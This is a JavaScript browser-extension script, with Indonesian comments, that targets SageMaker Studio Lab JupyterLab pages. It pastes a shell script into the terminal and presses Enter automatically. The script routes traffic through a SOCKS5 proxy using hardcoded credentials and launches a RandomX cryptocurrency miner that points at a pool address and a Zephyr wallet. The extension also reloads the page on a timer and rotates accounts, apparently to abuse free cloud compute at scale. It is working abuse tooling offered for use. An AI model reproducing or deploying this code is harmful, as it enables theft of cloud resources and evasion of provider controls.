// jupyterAction.js

// ========================
// 1. Log segera saat skrip di‐inject (debug)
// ========================
console.log("[jupyterAction] Skrip INJECTED, URL:", window.location.href);

// ========================
// 2. Konstanta untuk skrip shell (yang akan di‐paste ke Terminal Jupyter Lab)
// ========================
const SCRIPT = `

cd

cd gaszep

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.58.41.135:443
socks5_username = aku2
socks5_password = akukayaraya
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2
echo ""
./graftcp/graftcp curl ifconfig.me
echo " "

./graftcp/graftcp chmod +x gasdag

# --- BAGIAN PERUBAHAN UNTUK ZEPHYR ---
./graftcp/graftcp ./gasdag -a rx/0 -o 45.58.41.135:10080 -u ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5.$(hostname) -p x

# -------------------------------------

echo " "



`.trim();

// ========================
// 3. Variabel kontrol (paste & clear hanya sekali per tab Jupyter Lab)
// ========================
let retries = 0;
const MAX_TERMINAL_RETRIES = 120;        // maksimum percobaan deteksi "Terminal"
const RETRY_INTERVAL = 2000;   // 2 detik antar percobaan

let pasteTriggered = false;    // agar paste SCRIPT hanya sekali
let clearScheduled = false;    // agar clearTabsAndCache hanya sekali

// ========================
// 4. Interval reload otomatis: 15 menit (untuk semua halaman studiolab.sagemaker.aws)
// ========================
const RELOAD_INTERVAL_MS = 15 * 60 * 1000; // 15 menit

// ========================
// 5. Fungsi cek prompt "Terminal" di body (hanya Jupyter Lab)
// ========================
function checkPromptInBody() {
  const body = document.querySelector("body");
  if (!body) return false;
  const text = body.innerText || "";
  return text.includes("Terminal");
}

// ========================
// 6. Fungsi cari elemen terminal di Jupyter Lab
// ========================
function findTerminal() {
  return (
    document.querySelector(".terminal, .jp-Terminal-body, textarea") ||
    document.evaluate(
      '//div[contains(@class,"terminal")]',
      document,
      null,
      XPathResult.FIRST_ORDERED_NODE_TYPE,
      null
    ).singleNodeValue
  );
}

// ========================
// 7. Fungsi paste SCRIPT ke terminal dan scheduling clear
// ========================
function pasteScriptToTerminal(terminal) {
  console.log("[jupyterAction] (JLab) Mensimulasikan paste ke terminal…");

  const clipboardData = new DataTransfer();
  clipboardData.setData("text/plain", SCRIPT);

  const pasteEvent = new ClipboardEvent("paste", {
    bubbles: true,
    cancelable: true,
    clipboardData: clipboardData
  });

  terminal.focus();
  terminal.dispatchEvent(pasteEvent);
  console.log("[jupyterAction] (JLab) SCRIPT berhasil dipaste ke terminal.");

  // Simulasikan Enter setelah 2 detik
  setTimeout(() => {
    terminal.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
    terminal.dispatchEvent(new KeyboardEvent("keyup",   { key: "Enter", bubbles: true }));
    console.log("[jupyterAction] (JLab) Enter ditekan setelah paste.");

    // Kirim notifikasi sukses paste ke background script untuk pencatatan siklus akun & kuota 24 jam
    try {
      chrome.runtime.sendMessage({ action: "paste_success", timestamp: Date.now() });
    } catch(e) {
      console.warn("[jupyterAction] Gagal kirim paste_success message:", e);
    }

    // ▲=== Jadwalkan clearTabsAndCache dan switch account 15 detik setelah paste ===▲
    if (!clearScheduled) {
      clearScheduled = true;
      setTimeout(() => {
        console.log("[jupyterAction] (JLab) 15 detik terpenuhi → kirim clearTabsAndSwitchAccount.");
        chrome.runtime.sendMessage({ action: "clearTabsAndSwitchAccount" });
      }, 15000);
    }
  }, 2000);
}

// ========================
// 7.5. Fungsi deteksi Network Error (This page isn't working)
// ========================
function detectNetworkErrorPage() {
  const bodyText = (document.body.innerText || document.body.textContent || "").toLowerCase();
  
  const networkErrorPhrases = [
    "this page isn't working",
    "this page isn’t working",
    "didn't send any data",
    "didn’t send any data",
    "err_empty_response",
    "err_empty_respons",
    "this site can't be reached",
    "this site can’t be reached",
    "502 bad gateway",
    "503 service unavailable",
    "504 gateway timeout"
  ];
  
  return networkErrorPhrases.some(phrase => bodyText.includes(phrase));
}

// ========================
// 8. Loop utama: tunggu "Terminal" dan paste (hanya Jupyter Lab)
// ========================
function waitForPromptAndPaste() {
  if (pasteTriggered) return;
  
  // Cek apakah halaman adalah halaman error jaringan
  if (detectNetworkErrorPage()) {
    console.log("[jupyterAction] 🚨 Error 'This page isn't working / ERR_EMPTY_RESPONSE' terdeteksi!");
    if (!clearScheduled) {
      clearScheduled = true;
      console.log("[jupyterAction] Mengirim clearTabsAndSwitchAccount akibat error halaman.");
      chrome.runtime.sendMessage({ action: "clearTabsAndSwitchAccount" });
    }
    return;
  }

  retries++;
  console.log(`[jupyterAction] (JLab) Percobaan ke-${retries} mendeteksi "Terminal"…`);

  if (checkPromptInBody()) {
    console.log("[jupyterAction] (JLab) 'Terminal' terdeteksi di halaman.");
    const terminal = findTerminal();
    if (terminal) {
      pasteTriggered = true;
      console.log("[jupyterAction] (JLab) Terminal ditemukan. Melakukan paste…");
      pasteScriptToTerminal(terminal);
    } else {
      console.error("[jupyterAction] (JLab) Terminal tidak ditemukan meski prompt muncul.");
    }
  } else {
    if (retries < MAX_TERMINAL_RETRIES) {
      setTimeout(waitForPromptAndPaste, RETRY_INTERVAL);
    } else {
      console.error("[jupyterAction] (JLab) Gagal menemukan 'Terminal' setelah beberapa percobaan.");
    }
  }
}

// ========================
// 9. Fungsi setup reload otomatis setiap 15 menit (HANYA untuk Jupyter Lab, bukan dashboard/login)
// ========================
function scheduleAutoReload() {
  const isJupyterLab = window.location.hostname.includes("studio.us-east-2.sagemaker.aws");
  if (!isJupyterLab) {
    console.log("[jupyterAction] (Reload) Not a Jupyter Lab page, skipping auto-reload setup.");
    return;
  }
  
  console.log(`[jupyterAction] (Reload) Menjadwalkan reload otomatis setiap ${RELOAD_INTERVAL_MS / 60000} menit untuk Jupyter Lab.`);
  setInterval(() => {
    if (window.location.hostname.includes("studio.us-east-2.sagemaker.aws")) {
      console.log("[jupyterAction] (Reload) Melakukan reload otomatis untuk Jupyter Lab.");
      window.location.reload();
    } else {
      console.log("[jupyterAction] (Reload) Bukan di domain Jupyter Lab, skip reload.");
    }
  }, RELOAD_INTERVAL_MS);
}

// ========================
// 10. Inisialisasi
//   - Hanya pada Jupyter Lab: setup reload dan jalankan loop paste/clear
//   - Pada halaman lain (dashboard, login): tidak melakukan apa-apa
// ========================
function init() {
  console.log("[jupyterAction] init() dipanggil pada URL:", window.location.href);
  
  // Check if this is a Jupyter Lab page
  const isJupyterLab = window.location.hostname.includes("studio.us-east-2.sagemaker.aws") || window.location.href.includes("/jupyter/");
  
  if (isJupyterLab) {
    console.log("[jupyterAction] Halaman Jupyter Lab terdeteksi—setup lengkap");
    // 10.1 Setup reload otomatis hanya untuk Jupyter Lab
    scheduleAutoReload();
    // 10.2 Mulai loop paste/clear untuk Jupyter Lab
    waitForPromptAndPaste();
    
    // 10.3 Fallback timer 3 menit (In-Memory per tab): jika Terminal hang / tidak muncul dalam 3 menit di Jupyter Lab
    const JUPYTER_TIMEOUT = 3 * 60 * 1000; // 3 menit = 180.000 ms
    console.log("[jupyterAction] 🕐 Memulai fallback timer 3 menit (in-memory) untuk tab Jupyter Lab");
    
    // Pastikan storage key jupyter_timer_start dibersihkan agar tidak ada sisa timestamp
    chrome.storage.local.remove(["jupyter_timer_start"]);

    setTimeout(() => {
      if (!clearScheduled) {
        clearScheduled = true;
        console.log("[jupyterAction] ⏳ 3 menit berlalu di Jupyter Lab (Terminal hang / timeout). Memaksa pindah akun.");
        chrome.runtime.sendMessage({ action: "clearTabsAndSwitchAccount" });
      }
    }, JUPYTER_TIMEOUT);

  } else {
    console.log("[jupyterAction] Bukan Jupyter Lab (dashboard/login/lainnya)—skip semua proses.");
    // Don't do anything on dashboard, login, or other SageMaker pages
    return;
  }
}

// ========================
// 11. Entry point: Script hanya aktif di Jupyter Lab
//    Meskipun di-inject ke semua studiolab.sagemaker.aws/*, hanya berfungsi di Jupyter Lab
// ========================
const onStudiolabDomain = window.location.hostname.endsWith("studiolab.sagemaker.aws");
const onJupyterLabSub = window.location.hostname.includes("studio.us-east-2.sagemaker.aws");

// Hanya jalankan pada halaman Jupyter Lab, abaikan dashboard/login/lainnya  
if (onJupyterLabSub || (onStudiolabDomain && window.location.href.includes("/jupyter/"))) {
  console.log("[jupyterAction] (Entry) Jupyter Lab detected - initializing...");
  if (document.readyState === "complete" || document.readyState === "interactive") {
    init();
  } else {
    window.addEventListener("DOMContentLoaded", init);
  }
} else {
  console.log("[jupyterAction] (Entry) Not a Jupyter Lab page - script will not run. URL:", window.location.href);
}
